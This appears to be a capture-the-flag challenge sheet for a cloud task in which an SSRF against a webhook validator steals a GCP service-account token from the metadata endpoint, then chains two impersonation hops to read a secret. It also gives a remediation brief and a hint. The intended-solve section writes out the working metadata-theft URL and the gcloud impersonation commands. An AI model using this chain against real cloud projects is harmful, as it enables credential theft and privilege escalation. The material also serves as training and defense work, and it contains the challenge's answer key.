# h01 — Token Relay (Ape Ride)

**Category:** Cloud / SSRF → impersonation chain · **Difficulty:** Insane · **Points:** 500 (dynamic)

## Intended solve
```sh
# 0) The "webhook validator" fetches a URL you give it and REFLECTS THE RESPONSE BODY
#    (semi-blind — so you can actually read the token). Egress to metadata is reachable.

# 1) Steal the app SA token via SSRF:
url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
#   -> ya29... (SA "webhook-runner@")

# 2) webhook-runner has roles/iam.serviceAccountTokenCreator on a SECOND SA (relay@):
gcloud iam service-accounts get-iam-policy relay@<proj>.iam.gserviceaccount.com --access-token=$T1
#   -> webhook-runner is Token Creator on relay@
T2=$(gcloud auth print-access-token --impersonate-service-account=relay@... )   # hop 1

# 3) relay@ is Token Creator on a THIRD, secret-reading SA (vault-reader@):
#    impersonate again (two-hop chain):
gcloud secrets versions access latest --secret=ape-ride-crownjewels \
  --impersonate-service-account=vault-reader@<proj>.iam.gserviceaccount.com     # hop 2 -> CYPHER{...}
```
Two impersonation hops: `webhook-runner → relay → vault-reader`. The SSRF only gets you the first
identity; the flag needs the full chain.

## Infra & safety
- Per-team SSRF app on a GCE VM; **semi-blind** (reflects fetched body) so token exfil is
  hard-but-fair under the clock — not a luck game.
- Three SAs, each least-privilege: `webhook-runner` (TokenCreator on `relay` only), `relay`
  (TokenCreator on `vault-reader` only), `vault-reader` (`secretAccessor` on the one secret).
  No identity in the chain has project-wide access; the IAM healthcheck asserts each scope.

## Remediation (Blue Team Brief)
Block egress to `169.254.169.254`; allow-list SSRF fetch targets. Audit
`serviceAccountTokenCreator` bindings — each is a lateral-movement edge; chained impersonation is
the escalation. Alert on impersonation, especially multi-hop.

## Hint (costed, non-giveaway)
"The identity you land on is not the one that reads the secret." — cost 100.
